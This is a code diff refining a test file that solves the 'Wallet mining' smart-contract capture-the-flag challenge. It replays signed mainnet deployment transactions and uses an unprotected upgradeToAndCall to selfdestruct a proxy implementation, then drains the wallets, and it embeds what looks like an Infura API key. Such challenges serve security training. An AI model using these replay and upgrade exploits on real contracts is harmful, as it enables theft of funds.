@@ -65,76 +65,95 @@ describe('[Challenge] Wallet mining', function () {
     });
 
     it('Execution', async function () {
-        const mainnetProvider = new ethers.providers.InfuraProvider(
-            "mainnet",
-            "becb033f3bc54e01b6213b3a4f7665a3"
+
+        // there are two vulns
+        // firstly, contracts mentioned in the challenge formulation exist on the mainnet
+        // and we can recreate them using a replay attack
+        // secondly, AuthorizerUpgradeable has an alternative implementation of upgradeToAndCall
+        // without onlyProxy modifier
+        // so it can be called on the implementation directly => we can destroy it
+        // the highly optimized can function in WalletDeployer will just return true after this
+        // then we will create enough wallets until we stuble upon 0x9b6fb606a9f5789444c17768c6dfcf2f83563801
+        // and also get all the prizes for the wallets creation
+
+        // keccak256("eip1967.proxy.implementation") - 1
+        // storage slot where an eip1967 proxy keeps the implementation address
+        const IMPLEMENTATION_SLOT = "0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc";
+
+        // address of the safe deployer on the mainnet
+        // it deployed the real contracts from this challenge
+        const SAFE_DEPLOYER = "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A";
+
+        const PROXY_FACTORY = "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b";
+        const MASTER_COPY = "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F";
+
+        /** SET RPC URL HERE */
+        const MAINNET_URL = "https://mainnet.infura.io/v3/becb033f3bc54e01b6213b3a4f7665a3";
+        const mainnetProvider = new ethers.providers.JsonRpcProvider(MAINNET_URL);
+
+        const transactions = [
+            // deploying master copy at MASTER_COPY
+            await mainnetProvider.getTransaction("0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3"),
+            // setting implementation
+            await mainnetProvider.getTransaction("0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4"),
+            // creating proxy factory at PROXY_FACTORY
+            await mainnetProvider.getTransaction("0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261")
+        ];
+
+        // splitting transaction into unsigned part and signature
+        // to use in ethers.utils.serializeTransaction
+        const txToUnsignedAndSignature = (tx) => {
+            unsignedProperties = ["to", "nonce", "gasLimit", "gasPrice", "data", "value", "chainId"];
+            signatureProperties = ["v", "r", "s"];
+            getPair = (key => [key, tx[key]]);
+            unsignedTx = Object.fromEntries(unsignedProperties.map(getPair));
+            signature = Object.fromEntries(signatureProperties.map(getPair));
+            return [unsignedTx, signature];
+        }
+
+        rawTransactions = transactions.map(txToUnsignedAndSignature).map(
+            tup => ethers.utils.serializeTransaction(...tup)
         );
-        tx0 = await mainnetProvider.getTransaction("0x06d2fa464546e99d2147e1fc997ddb624cec9c8c5e25a050cc381ee8a384eed3");
-        tx1 = await mainnetProvider.getTransaction("0x31ae8a26075d0f18b81d3abe2ad8aeca8816c97aff87728f2b10af0241e9b3d4");
-        tx2 = await mainnetProvider.getTransaction("0x75a42f240d229518979199f56cd7c82e4fc1f1a20ad9a4864c635354b4a34261");
-        unsignedTx0 = {
-            to: tx0.to,
-            nonce: tx0.nonce,
-            gasLimit: tx0.gasLimit,
-            gasPrice: tx0.gasPrice,
-            data: tx0.data,
-            value: tx0.value,
-            chainId: tx0.chainId
-        };
-        unsignedTx1 = {
-            to: tx1.to,
-            nonce: tx1.nonce,
-            gasLimit: tx1.gasLimit,
-            gasPrice: tx1.gasPrice,
-            data: tx1.data,
-            value: tx1.value,
-            chainId: tx1.chainId
-        };
-        unsignedTx2 = {
-            to: tx2.to,
-            nonce: tx2.nonce,
-            gasLimit: tx2.gasLimit,
-            gasPrice: tx2.gasPrice,
-            data: tx2.data,
-            value: tx2.value,
-            chainId: tx2.chainId
-        };
-        signature0 = {
-            v: tx0.v,
-            r: tx0.r,
-            s: tx0.s
-        }
-        signature1 = {
-            v: tx1.v,
-            r: tx1.r,
-            s: tx1.s
-        }
-        signature2 = {
-            v: tx2.v,
-            r: tx2.r,
-            s: tx2.s
-        }
-        rawTx0 = ethers.utils.serializeTransaction(unsignedTx0, signature0);
-        rawTx1 = ethers.utils.serializeTransaction(unsignedTx1, signature1);
-        rawTx2 = ethers.utils.serializeTransaction(unsignedTx2, signature2);
-        await player.sendTransaction({to: "0x1aa7451DD11b8cb16AC089ED7fE05eFa00100A6A", value: 10n**17n});
-        await ethers.provider.sendTransaction(rawTx0);
-        await ethers.provider.sendTransaction(rawTx1);
-        await ethers.provider.sendTransaction(rawTx2);
-        proxyFactory = await ethers.getContractAt("GnosisSafeProxyFactory", "0x76e2cfc1f5fa8f6a5b3fc4c8f4788f0116861f9b", player);
-        masterCopy = await ethers.getContractAt("GnosisSafe", "0x34CfAC646f301356fAa8B21e94227e3583Fe3F5F", player);
+        await player.sendTransaction({
+            to: SAFE_DEPLOYER, 
+            value: 10n**17n
+        });
+        await rawTransactions.map(ethers.provider.sendTransaction);
 
-        authorizerImplmentation = await (await ethers.getContractFactory('AuthorizerUpgradeable')).attach('0xe7f1725e7734ce288f8367e1bb143e90bb3f0512');
+        proxyFactory = await ethers.getContractAt(
+            "GnosisSafeProxyFactory", 
+            PROXY_FACTORY, 
+            player
+        );
+        masterCopy = await ethers.getContractAt(
+            "GnosisSafe", 
+            MASTER_COPY, 
+            player
+        );
+
+        implementationSlotValue = await ethers.provider.getStorageAt(
+            authorizer.address, 
+            IMPLEMENTATION_SLOT
+        );
+        implementationAddress = ethers.utils.getAddress("0x" + implementationSlotValue.slice(-40).toString("hex"));
+        authorizerImplmentation = await ethers.getContractAt(
+            "AuthorizerUpgradeable", 
+            implementationAddress 
+        );
         badAuthorizer = await (await ethers.getContractFactory('BadAuthorizerUpgradeable', player)).deploy();
-        dieABI = ["function die(address player)"];
-        dieInterface = new ethers.utils.Interface(dieABI);
-        dieCallData = dieInterface.encodeFunctionData("die", [player.address]); 
+        selfDestructCallData = badAuthorizer.interface.encodeFunctionData(
+            "selfDestruct", 
+            [player.address]
+        ); 
         await authorizerImplmentation.init([], []);
-        await authorizerImplmentation.upgradeToAndCall(badAuthorizer.address, dieCallData);
+        await authorizerImplmentation.upgradeToAndCall(badAuthorizer.address, selfDestructCallData);
 
-        attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(walletDeployer.address);
+        attacker = await (await ethers.getContractFactory('WalletMiningAttacker', player)).deploy(
+            walletDeployer.address
+        );
 
         await attacker.attack();
+
     });
 
     after(async function () {
